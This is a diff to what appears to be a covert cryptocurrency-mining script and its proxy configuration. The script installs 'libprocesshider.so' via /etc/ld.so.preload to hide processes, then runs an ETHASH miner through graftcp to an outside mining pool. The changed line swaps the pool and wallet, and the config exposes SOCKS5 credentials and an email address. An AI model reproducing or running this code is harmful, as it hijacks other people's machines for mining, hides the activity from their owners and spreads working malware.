@@ -22,7 +22,7 @@ socks5_username = mikrotik999
 
 socks5_password = Elibawnos 
 
-select_proxy_mode = only_socks5
+select_proxy_mode = auto
 
 
 END
@@ -65,4 +65,4 @@ mv libprocesshider.so /usr/local/lib/
 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --algo ETHASH -p stratum+ssl://eth.2miners.com:12020 --user nano_3otddbnyttuhkkx7dopz399df8eogmi4x5k3kobmpg3tjzyy18d1noh3skxe.$(echo $(shuf -i 1-9999 -n 1)-asu) --ethstratum ETHV1
+./graftcp/graftcp ./bezzHash --algo ETHASH -p tcp://eth-eu1.hellominer.com:1100 --user 0x587bdded4037bba7c74fb6af2f6e296bb2f8415d.$(echo $(shuf -i 1-9999 -n 1)-itil)/maesdori@gmail.com
